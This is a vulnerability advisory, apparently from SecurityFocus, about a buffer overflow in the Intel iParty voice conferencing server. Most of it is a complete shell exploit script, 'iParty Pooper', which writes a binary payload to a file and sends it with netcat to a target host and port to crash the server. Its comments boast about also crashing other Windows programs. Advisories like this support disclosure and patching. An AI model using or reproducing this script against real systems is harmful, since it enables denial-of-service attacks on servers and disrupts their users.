source: http://www.securityfocus.com/bid/6844/info

A buffer overflow condition has been discovered in the Intel iParty server.

It is possible to trigger a denial of service by submitting an excessive number of characters to the network port used by the iParty server. The server will need to be restarted to regain normal functionality.

This issue may be due to a buffer overrun, potentially resulting in arbitrary code execution. This possibility has not been confirmed. 

#!/bin/sh
# iParty Pooper by Ka-wh00t (wh00t@iname.com) - early May '99 - Created out of pure boredom.
# iParty is a cute little voice conferencing program still widely used (much to my surprise.)
# Unfortuneately, the daemon, that's included in the iParty download, can be shut down remotely.
# And in some circumstances, this can lead to other Windows screw-ups (incidents included internet
# disconnection, ICQ GPFs, Rnaapp crashes, etc.) Sometimes the daemon closes quietly, other
times
# a ipartyd.exe GPF. DoSers will hope for the GPF. At time of this script's release, the latest
# (only?) version of iParty/iPartyd was v1.2
# FOR EDUCATIONAL PURPOSES ONLY.


if [ "$1" = "" ]; then
echo "Simple Script by Ka-wh00t to kill any iParty Server v1.2 and under. (ipartyd.exe)"
echo "In some circumstances can also crash other Windows progs and maybe even Windows itself."
echo "Maybe you'll get lucky."
echo ""
echo "Usage: $0 <hostname/ip> <port>"
echo "Port is probably 6004 (default port)."
echo ""
echo "Remember: You need netcat for this program to work."
echo "If you see something similar to 'nc: command not found', get netcat."
else
if [ "$2" = "" ]; then
echo "I said the port is probably 6004, try that."
exit
else
rm -f ipp00p
cat > ipp00p << _EOF_
$6�]}tTյ?"̐a?p/?H�D?0iA�L%��?EBEԁ�'*}�y�ԥ(3�z?�n�u�ԏj+��(�?�?�d'??��ZiX��y7�'``���ϝ	C�����ʹ�������>�ܐE�6?�^��^v�?�^�:��{n"u��'g=o��?8�Ӂ'L5"�鲱?�ခ�DRG�I�lq?Y�g?��i?�i՟�H�H?w?�ᜲ��3�l??*o�#�sC9m,

_EOF_
echo ""
echo "Sending kill..."
cat ipp00p | nc $1 $2
echo "Done."
rm -f ipp00p
fi
fi